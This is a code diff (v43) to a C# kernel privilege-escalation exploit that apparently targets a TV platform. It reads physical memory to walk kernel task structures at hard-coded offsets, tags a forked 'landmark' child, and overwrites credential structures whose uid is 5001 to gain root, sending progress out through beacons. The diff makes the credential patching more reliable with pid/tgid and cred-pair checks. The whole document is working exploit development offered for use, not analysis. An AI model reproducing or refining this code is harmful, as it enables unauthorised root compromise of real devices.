@@ -48,6 +48,13 @@ internal static class Program
     const uint O_REAL = 0x3F4;
     const uint O_CHILDREN = 0x2F8;   // list_head children (pontusml DWARF, next to the TV-measured 0x2F0/0x2F4)
     const uint O_SIBLING = 0x300;    // fork() links &child->sibling into &parent->children
+    // v43: pid/tgid for the landmark check.  Same DWARF struct as the offsets
+    // above (cred 0x3F8 / real_cred 0x3F4 / comm 0x400, all TV-measured), so a
+    // read here is the same fingerprinted layout.  A forked child is its own
+    // thread-group leader, so pid == tgid == the pid fork() returned; a pthread
+    // would share the parent's tgid, which is why both words are checked.
+    const uint O_PID = 0x2E8;
+    const uint O_TGID = 0x2EC;
     static readonly byte[] SEQ = Encoding.ASCII.GetBytes("name_to_dev_t\0init_task\0kernel_neon_end");
     static readonly byte[] IMG_SIG = { 0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1 };
 
@@ -85,6 +92,17 @@ internal static class Program
     static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
     // fork() landmark pids that still need reaping (see ReapChildren).
     static readonly List<int> ChildPids = new List<int>();
+    // v43: per-run comm tags.  The payload and its landmark child used CONSTANT
+    // "PHYSRPT1" / "PHYRFORK" names, so a task left over from an earlier AUL
+    // launch looked exactly like this run's - which is the stale-task family the
+    // `pre` snapshot only papered over (a landmark created between the snapshot
+    // and the fork, or a reused pid, defeated it).  Both tags now carry this
+    // process's pid in hex: comm is 16 bytes including the NUL, and
+    // "PHYRFORK"+8 hex = 15, so a tag always fits.  The latch prefers an exact
+    // tag match and, on the fallback path, refuses a task whose pid/tgid fields
+    // are readable and disagree with the fork() pid.
+    static string _selfTag = "PHYSRPT1";                       // replaced in Main
+    static byte[] _selfTagBytes = Encoding.ASCII.GetBytes("PHYSRPT1");
     const int WNOHANG = 1;
 
     // Where should beacons go? The address the last deploy recorded on the TV wins over
@@ -676,6 +694,47 @@ internal static class Program
     // direct-parent path replaced the comm scan; the round walk in Main() does
     // the tail scan itself, with the `pre`/latch logic that made this obsolete.)
 
+    // ---- v43 landmark checks ------------------------------------------------
+    // "PREFIX" + hex(pid) is the per-run comm tag (16-byte comm incl. the NUL).
+    static string TagFor(string prefix, int pid) { return prefix + pid.ToString("X"); }
+
+    // Allocation-free tag writer for the post-fork child: no CLR allocations are
+    // allowed there, so the digits are written into a pre-pinned buffer.
+    static void WriteTag(byte[] buf, string prefix, int pid)
+    {
+        for (int i = 0; i < buf.Length; i++) buf[i] = 0;
+        int n = prefix.Length; if (n > buf.Length) n = buf.Length;
+        for (int i = 0; i < n; i++) buf[i] = (byte)prefix[i];
+        int digits = 1;
+        for (int v = pid; v >= 16; v >>= 4) digits++;
+        if (n + digits > buf.Length) digits = buf.Length - n;
+        for (int i = 0; i < digits; i++)
+        {
+            int nib = (pid >> (4 * (digits - 1 - i))) & 0xF;
+            buf[n + i] = (byte)(nib < 10 ? '0' + nib : 'A' + nib - 10);
+        }
+    }
+
+    // task->pid, or -1 when the task page does not read back coherently.  pid
+    // and tgid must agree: fork() makes the child its own group leader, while a
+    // pthread would inherit the creator's tgid (never a landmark here).
+    static int TaskPid(uint task)
+    {
+        try
+        {
+            uint w = U32(ReadPhys(V2P(task) + O_PID, 4), 0);
+            uint g = U32(ReadPhys(V2P(task) + O_TGID, 4), 0);
+            if (w != g || w == 0 || w > 0x7FFFFFFF) return -1;
+            return (int)w;
+        }
+        catch { return -1; }
+    }
+
+    // A normal process has cred == real_cred (one pointer).  A differing pair is
+    // setuid/exec bookkeeping this payload never causes, so refuse it instead of
+    // writing a foreign pair blind.
+    static bool SameCredPair(uint cred, uint real) { return cred != 0 && cred == real; }
+
     // Pointer-shape validation only: a real cred lives in the direct map, has a
     // small refcount and plausible ids.  Whether it is OURS is PatchCred's job
     // (uid == 5001); Python's _sane_cred is the same shape check.
@@ -845,7 +904,7 @@ internal static class Program
         const int BudgetMs = 2500;     // attempt 1 must still exit fast
         const int SpanPages = 4096;    // +/- 16 MiB requested around the anchor page
         var sw = System.Diagnostics.Stopwatch.StartNew();
-        byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");   // Main()'s PR_SET_NAME
+        byte[] selfTag = _selfTagBytes;    // Main()'s per-run PR_SET_NAME
         // Search the 8 name bytes per page and verify the NUL follow-byte at
         // hit+8 (one cross-page byte read, only on candidate hits).  A carry
         // across pages would be order-dependent: the outward +/-step walk does
@@ -1591,7 +1650,12 @@ internal static class Program
     static void Main()
     {
         AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
-        prctl(15, "PHYSRPT1", 0, 0, 0);   // PR_SET_NAME on this thread
+        // v43: the PR_SET_NAME tag carries this run's pid, so a leftover PHYSRPT
+        // task from an earlier AUL launch can never be mistaken for ours (the
+        // constant "PHYSRPT1" made every launch look identical).
+        _selfTag = TagFor("PHYSRPT", Environment.ProcessId);
+        _selfTagBytes = Encoding.ASCII.GetBytes(_selfTag);
+        prctl(15, _selfTag, 0, 0, 0);   // PR_SET_NAME on this thread
 
         Beacon("start uid=" + getuid() + " pid=" + Environment.ProcessId);
         try
@@ -1636,10 +1700,14 @@ internal static class Program
             // child is only a landmark.  A pre-fork snapshot of existing
             // PHYRFORK tasks keeps us from latching onto an orphan from an
             // earlier AUL restart (that caused "child-patch=True uid=5001").
-            byte[] forkName = Encoding.ASCII.GetBytes("PHYRFORK\0");
-            GCHandle forkNamePin = GCHandle.Alloc(forkName, GCHandleType.Pinned);
-            int forkNamePtr = forkNamePin.AddrOfPinnedObject().ToInt32();
-            byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");
+            // v43: the child's tag is "PHYRFORK"+hex(its pid), written in the
+            // child into this pre-pinned buffer (no CLR allocations post-fork),
+            // so the latch can accept the exact tag instead of "any new
+            // PHYRFORK".  The snapshot stays as the second line of defence.
+            byte[] childName = new byte[16];
+            GCHandle childNamePin = GCHandle.Alloc(childName, GCHandleType.Pinned);
+            int childNamePtr = childNamePin.AddrOfPinnedObject().ToInt32();
+            byte[] selfTag = _selfTagBytes;
             uint child = 0, self = 0, childPu = 0xFFFFFFFF;
 
             // v9: AUL restarts this app about one second after it exits, and a
@@ -1714,12 +1782,16 @@ internal static class Program
                     // next AUL launch then sits in the 120 s open() retry (exactly
                     // what v9 fast-exit was meant to avoid).
                     if (_fd >= 0) syscall(6, _fd, 0, 0, 0, 0, 0);     // close(fd)
-                    syscall(172, 15, forkNamePtr, 0, 0, 0, 0);        // prctl(PR_SET_NAME)
+                    int cpid = syscall(20, 0, 0, 0, 0, 0, 0);         // getpid()
+                    WriteTag(childName, "PHYRFORK", cpid);            // raw writes only
+                    syscall(172, 15, childNamePtr, 0, 0, 0, 0);       // prctl(PR_SET_NAME)
                     usleep(120000000);                                // 120 s landmark
                     _exit(0);
                 }
                 if (pid < 0) { Beacon("fork failed " + pid); Thread.Sleep(1000); continue; }
                 ChildPids.Add(pid);
+                // What the child's comm must read: fork() returns the child's pid.
+                string expectChild = TagFor("PHYRFORK", pid);
                 ReapChildren();
                 Thread.Sleep(700);        // let the child set its tag
                 DropPages();              // see the kernel's post-fork writes
@@ -1732,6 +1804,9 @@ internal static class Program
                 // up quickly and lets AUL relaunch a fresh process (fresh mmap) instead of
                 // burning 20 s per round. The long fallback keeps the patient budget.
                 var deadline = DateTime.UtcNow.AddSeconds(fastMode ? 3 : 20);
+                // v43: which latch accepted the child, for the beacon.
+                string tagHow = "none";
+                int staleTags = 0;
                 while (DateTime.UtcNow < deadline)
                 {
                     DropPages();
@@ -1755,17 +1830,41 @@ internal static class Program
                                 seenFork++;
                                 uint pu = ChildParentUid(task);
                                 lastPu = pu;
-                                if (pu == 5001) { ours = task; oursPu = pu; }
+                                // v43: exact per-run tag first, then the pid/tgid
+                                // check.  A leftover landmark from an earlier AUL
+                                // launch carries neither, so it is REFUSED here
+                                // instead of being patched (the stale-task family).
+                                if (nm == expectChild)
+                                {
+                                    ours = task; oursPu = pu; tagHow = "exact";
+                                }
                                 else
                                 {
-                                    skipOrphan++;
-                                    // v23: any new landmark. v22 required pu 0 / unreadable
-                                    // and missed the cold-boot child (pu was some other stale word).
-                                    maybe = task;
-                                    maybePu = pu;
+                                    int tpid = TaskPid(task);
+                                    if (tpid >= 0 && tpid == pid)
+                                    {
+                                        ours = task; oursPu = pu; tagHow = "pid";
+                                    }
+                                    else if (tpid >= 0)
+                                    {
+                                        staleTags++;      // readable, not this run's
+                                    }
+                                    else if (pu == 5001)
+                                    {
+                                        ours = task; oursPu = pu; tagHow = "prefix";
+                                    }
+                                    else
+                                    {
+                                        skipOrphan++;
+                                        // v23: any new landmark. v22 required pu 0 / unreadable
+                                        // and missed the cold-boot child (pu was some other stale word).
+                                        maybe = task;
+                                        maybePu = pu;
+                                    }
                                 }
                             }
-                            if (nm.StartsWith("PHYSRPT")) self = task;
+                            if (nm == _selfTag) self = task;
+                            else if (nm.StartsWith("PHYSRPT")) self = task;   // legacy tag
                             if (round == 0 && names.Length < 120) names.Append(nm).Append(',');
                             try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                         }
@@ -1779,14 +1878,15 @@ internal static class Program
                 if (child == 0)
                 {
                     Beacon("fail no new PHYRFORK seen=" + seenFork +
-                           " skip-orphan=" + skipOrphan +
+                           " skip-orphan=" + skipOrphan + " stale-tag=" + staleTags +
                            " pu=" + lastPu.ToString("x"));
                     KillChildren();
                     Thread.Sleep(1000);
                     continue;
                 }
                 Beacon("child=" + child.ToString("x8") + " self=" + self.ToString("x8") +
-                       " pu=" + UidWord(childPu));
+                       " pu=" + UidWord(childPu) + " tag=" + tagHow +
+                       " stale=" + staleTags);
 
                 if (self != 0)
                 {
@@ -1794,8 +1894,11 @@ internal static class Program
                     try { sc = U32(ReadPhys(V2P(self) + O_CRED, 4), 0); } catch { }
                     try { sr = U32(ReadPhys(V2P(self) + O_REAL, 4), 0); } catch { }
                     Beacon("self cred=" + sc.ToString("x8") + " real=" + sr.ToString("x8"));
-                    if (CredUid(sc) == 5001) PatchCred(sc);
-                    if (Kptr(sr) && sr != sc && CredUid(sr) == 5001) PatchCred(sr);
+                    // v43: only a consistent pair (cred == real_cred) is ours.
+                    if (SameCredPair(sc, sr) && CredUid(sc) == 5001) PatchCred(sc);
+                    else if (CredUid(sc) == 5001 || CredUid(sr) == 5001)
+                        Beacon("skip cred!=real self c=" + sc.ToString("x8") +
+                               " r=" + sr.ToString("x8"));
                     Beacon("self-patch uid=" + getuid());
                 }
 
@@ -1892,7 +1995,14 @@ internal static class Program
                                 else sawLow = true;
                             }
                             uint u = CredUid(cred);
-                            if (u == 5001)
+                            // v43: a consistent pair is the precondition.  The old
+                            // code patched cred and real_cred independently, which
+                            // could write a cred whose real_cred was a different
+                            // (stale/foreign) object - the direct-parent probe is a
+                            // pointer read, and one stale word is enough to make the
+                            // pair disagree.
+                            bool pairOk = SameCredPair(cred, real);
+                            if (u == 5001 && pairOk)
                             {
                                 Beacon("direct-parent+" + po.ToString("x") + "=" +
                                        parent.ToString("x8") + " cred=" + cred.ToString("x8"));
@@ -1900,10 +2010,11 @@ internal static class Program
                                     Beacon("direct-patch-fail po=" + po.ToString("x") +
                                            " cred=" + cred.ToString("x8"));
                             }
-                            if (Kptr(real) && real != cred && CredUid(real) == 5001)
+                            else if (u == 5001 || CredUid(real) == 5001)
                             {
-                                if (!PatchCred(real) && getuid() != 0)
-                                    Beacon("direct-patch-fail real=" + real.ToString("x8"));
+                                Beacon("skip cred!=real po=" + po.ToString("x") +
+                                       " c=" + cred.ToString("x8") +
+                                       " r=" + real.ToString("x8"));
                             }
                             // Fifth-pass diagnostic, silent on success: WHICH read
                             // is stale on a cold-boot attempt 1?  uid 0 = stale
@@ -2031,8 +2142,11 @@ internal static class Program
                         try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                         try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                         Beacon("parent=" + parent.ToString("x8") + " cred=" + cred.ToString("x8"));
-                        if (CredUid(cred) == 5001) PatchCred(cred);
-                        if (Kptr(real) && real != cred && CredUid(real) == 5001) PatchCred(real);
+                        // v43: same consistent-pair rule as the direct-parent path.
+                        if (SameCredPair(cred, real) && CredUid(cred) == 5001) PatchCred(cred);
+                        else if (CredUid(cred) == 5001 || CredUid(real) == 5001)
+                            Beacon("skip cred!=real parent c=" + cred.ToString("x8") +
+                                   " r=" + real.ToString("x8"));
                         Beacon("parent-patch uid=" + getuid());
                         if (getuid() == 0) break;
                     }
